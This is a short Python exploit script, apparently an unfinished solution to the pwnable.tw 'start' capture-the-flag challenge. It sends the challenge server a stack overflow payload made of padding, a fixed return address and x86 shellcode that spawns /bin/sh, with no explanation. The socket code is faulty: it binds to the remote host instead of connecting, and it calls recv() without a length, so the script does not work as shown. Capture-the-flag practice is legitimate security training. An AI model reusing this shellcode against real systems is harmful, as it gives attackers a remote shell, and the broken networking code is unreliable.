#################################################################################################
'''
// @Project      Pwnable CTF Challenge --start (Work in progress)
// @Author       Saccharide
'''
#################################################################################################

import socket

s = socket.socket()
s.bind(("chall.pwnable.tw",10000))

payload = b"\x41"*20 + b"\xfc\xd0\xff\xff" + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

s.send(payload)
s.recv()
